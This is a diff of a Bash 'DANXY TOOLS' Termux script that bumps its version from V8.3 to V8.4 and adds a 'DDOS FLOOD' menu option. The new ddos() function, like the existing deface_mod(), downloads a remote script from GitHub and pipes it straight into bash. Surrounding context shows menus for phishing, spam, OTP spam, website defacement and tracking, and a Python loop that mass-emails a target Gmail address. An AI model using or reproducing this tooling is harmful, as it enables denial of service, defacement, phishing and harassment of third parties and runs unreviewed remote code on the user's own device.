@@ -241,9 +241,9 @@ hello() {
 │ ██║░░██║███████║██╔██╗██║░╚███╔╝░░╚████╔╝░ │
 │ ${WHITE}██║░░██║██╔══██║██║╚████║░██╔██╗░░░╚██╔╝░░ │
 │ ██████╔╝██║░░██║██║░╚███║██╔╝╚██╗░░░██║░░░ │
-│ ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░ │ [ ${RED}V8.3${NC} ]
+│ ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░ │ [ ${RED}V8.4${NC} ]
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat
-    local txt=" HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.3 "
+    local txt=" HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.4 "
     local delay=0.04
     local len=${#txt}
 
@@ -280,7 +280,7 @@ echo -e "${GREEN}
  │ ${YELLOW}Your ID: ${your_id}          ${YELLOW}YT${NC}: ${RED}DanxyBot          TT${NC}: Qwela.38${NC}${GREEN}    │
  ╰─────────────────────────────────────────────────────────────────╯${NC}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
- │                     ${YELLOW}~ MENU UTAMA TOOLS V8.3 ~${NC}${GREEN}                   │
+ │                     ${YELLOW}~ MENU UTAMA TOOLS V8.4 ~${NC}${GREEN}                   │
  ├────────────┬─────────────────────────┬────────────┬─────────────┤
  │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │  PERINTAH  │   FUNGSI    │
  │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           ├────────────┴─────────────┤
@@ -304,7 +304,7 @@ echo -e "${GREEN}
  │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │                          │
  │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │                          │
  ├────────────┴─────────────────────────┴──────────────────────────┤
- │                 DANXY TOOLS V8.3 2024 - 2025                    │
+ │                 DANXY TOOLS V8.4 2024 - 2025                    │
  ├─────────────────────────────────────────────────────────────────┤
  ╰─────────────────────────────────────────────────────────────────╯" | lolcat
   #echo -e "${CYAN}"
@@ -324,7 +324,7 @@ main_menu() {
     klik
     banner
     show_menu
-    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
         read -r danxy
 
     case $danxy in
@@ -576,7 +576,7 @@ menu_suntik() {
   ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
   │ [  00  ] EXIT / KELUAR                             │
   ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat
-      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SUNTIK${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SUNTIK${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
       read -r SUNTIK_MENU
     case $SUNTIK_MENU in
       01|1)
@@ -789,9 +789,10 @@ menu_spam() {
   │ [  03  ] SPAM GAMIL V0.1                           │
   │ [  04  ] SPAM TELEGRAM V0.1                        │
   │ [  05  ] SPAM OTP V0.2                             │
+  │ [  06  ] DDOS FLOOD                                │
   │ [  00  ] Kembali                                   │
   ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat
-      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SPAM${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SPAM${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
       read -r SPAM_MENU
     case $SPAM_MENU in
       01|1)
@@ -818,7 +819,12 @@ menu_spam() {
       klik
       SpamOtpV
       klik
-       ;;
+      ;;
+      06|6)
+      klik
+      ddos
+      klik
+      ;;
       00|0) break ;;
       *) echo -e "${R}PILIHAN TIDAK VALID${N}"; sleep 1 ;;
     esac
@@ -837,7 +843,7 @@ phising_menu() {
    ██╔═══╝░██╔══██║██║░╚═══██╗██║██║╚████║██║░░╚██╗
    ██║░░░░░██║░░██║██║██████╔╝██║██║░╚███║╚██████╔╝
    ${NC}${RED}╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝
-   ${BG_RED}${YELLOW}CODE BY DANXY${NC}                  ${BG_RED}TOOLS V8.3${NC}"
+   ${BG_RED}${YELLOW}CODE BY DANXY${NC}                  ${BG_RED}TOOLS V8.4${NC}"
    echo " 
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [ 1 ] PHISING GAME AR V0.1                        │
@@ -853,7 +859,7 @@ phising_menu() {
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │               ALL BASE FITUR PHISING              │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat
-    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU PHISING${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU PHISING${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
     read -r CHOICE
 
     case $CHOICE in
@@ -3500,7 +3506,9 @@ deface_mod() {
   bash <(curl -sL "https://raw.githubusercontent.com/AsuKontolJembotKangDecodeKontol/BajinganAsuKontolTempekJembotKangDecode/refs/heads/main/deface.sh")
 }
 
-
+ddos() {
+  bash <(curl -sL "https://raw.githubusercontent.com/AsuKontolJembotKangDecodeKontol/BajinganAsuKontolTempekJembotKangDecode/refs/heads/main/1980.sh")
+}
 
 suntik_ig() {
 clear
@@ -3898,7 +3906,7 @@ cek_provider() {
 │██║░░░░░██║░░██║╚█████╔╝░░╚██╔╝░░██║██████╔╝███████╗██║░░██║ │
 │╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ │
 └─────────────────────────────────────────────────────────────┘
-│               DANXY TOOLS V8.3 FITUR PROVIDER               │
+│               DANXY TOOLS V8.4 FITUR PROVIDER               │
 └─────────────────────────────────────────────────────────────┘
 │ DEVELOPER DANXY OFFICIAL │
 └──────────────────────────┘ " | lolcat
@@ -4147,7 +4155,7 @@ kalkulator() {
   │  ██║░╚██╗██║░░██║███████╗██║░╚═╝░██║╚██████╔╝██╔╝╚██╗  │
   │  ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝  │
   └────────────────────────────────────────────────────────┘
-  │            DANXY TOOLS V8.3 FITUR KALKULATOR           │
+  │            DANXY TOOLS V8.4 FITUR KALKULATOR           │
   └────────────────────────────────────────────────────────┘
   │ DEVELOPER DANXY OFFICIAL │
   └──────────────────────────┘" | lolcat
@@ -4588,7 +4596,7 @@ clear
  ╰───────────────────────────────────────────────╯" | lolcat
    echo -e "${GREEN}● ${YELLOW}● ${RED}●"
    echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
-    printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} OSIN ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+    printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} OSIN ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
         read -r pilih
 
     case $pilih in
@@ -4688,7 +4696,7 @@ ${WHITE}██║░░██╗██╔══██║██╔══██║
 ${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
     echo "CARA KELUAR DARI AI CHAT: ketik Q lalu ENTER"
     echo
-    echo "DanxyToolsV8.3 AI Chat"
+    echo "DanxyToolsV8.4 AI Chat"
     echo
 
     while true; do
@@ -4713,7 +4721,7 @@ ${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
         # --- tangkap pertanyaan tentang nama ---
         if [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]]; then
             echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
-            echo -e "${CYAN}DanxyToolsV8.3:${NC} nama saya DanxyTools siap membantu kamu"
+            echo -e "${CYAN}DanxyToolsV8.4:${NC} nama saya DanxyTools siap membantu kamu"
             echo
             continue
         fi
@@ -4733,7 +4741,7 @@ ${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
                 [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."
 
                 echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
-                echo -e "${CYAN}DanxyToolsV8.3:${NC} $jawaban"
+                echo -e "${CYAN}DanxyToolsV8.4:${NC} $jawaban"
                 echo
                 break
             else
@@ -5565,7 +5573,7 @@ while true; do
   echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
    echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
    echo -e "     ${BG_RED}${YELLOW}[ ! ] MASUKAN NOMOR BERAWALAN 62${NC}"
-    printf "   ${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+    printf "   ${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
            read -r nomor
   [[ $nomor == [Qq] || -z $nomor ]] && break
   [[ ! $nomor =~ ^62[0-9]+$ ]] && { echo -e "${YELLOW}Nomor harus dimulai dengan 62 dan hanya angka.${NC}"; continue; }
@@ -5649,7 +5657,7 @@ clear
  ╰───────────────────────────────────────────────╯" | lolcat
    echo -e "${GREEN}● ${YELLOW}● ${RED}●"
    echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
-        printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+        printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
         read -r pilih
 
     case $pilih in
@@ -6348,7 +6356,7 @@ ${RED}⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀
                         [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
 " | lolcat
 echo -e "${GREEN}=========================================="
-echo -e "${BG_RED}${YELLOW}DANXY TOOLS V8.3${NC}"
+echo -e "${BG_RED}${YELLOW}DANXY TOOLS V8.4${NC}"
 echo -e "${GREEN}==========================================${NC}"
 echo -e "${BG_RED}${YELLOW}MENJALANKAN SERVER...${NC}"
 echo "                                                          "
@@ -6390,7 +6398,7 @@ echo -e "${WHITE}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
 " | lolcat
 garis | lolcat
-echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
+echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.4${BG_RED}                ${NC}┃" 
 garis_tutup | lolcat
 garis | lolcat
 echo -n "┃ 1. GMAIL TARGET: "; read -r target
@@ -6402,7 +6410,7 @@ garis_tengah | lolcat
 echo -n "┃ 4. JEDA DELAY [1/5]: "; read -r delay
 garis_tutup | lolcat
 garis | lolcat
-echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
+echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.4${BG_RED}                ${NC}┃" 
 garis_tutup | lolcat
 
 : "${jumlah:=1}"
@@ -6421,7 +6429,7 @@ for i in range(1, int(n)+1):
     m = smtplib.SMTP("smtp.gmail.com", 587)
     m.starttls()
     m.login(sender, pwd)
-    body = f"From: {sender}\r\nTo: {t}\r\nSubject: DANXY TOOLS V8.3 #{i}\r\n\r\n{msg}"
+    body = f"From: {sender}\r\nTo: {t}\r\nSubject: DANXY TOOLS V8.4 #{i}\r\n\r\n{msg}"
     m.sendmail(sender, t, body)
     m.quit()
     print(f"[✓] terkirim #{i}")
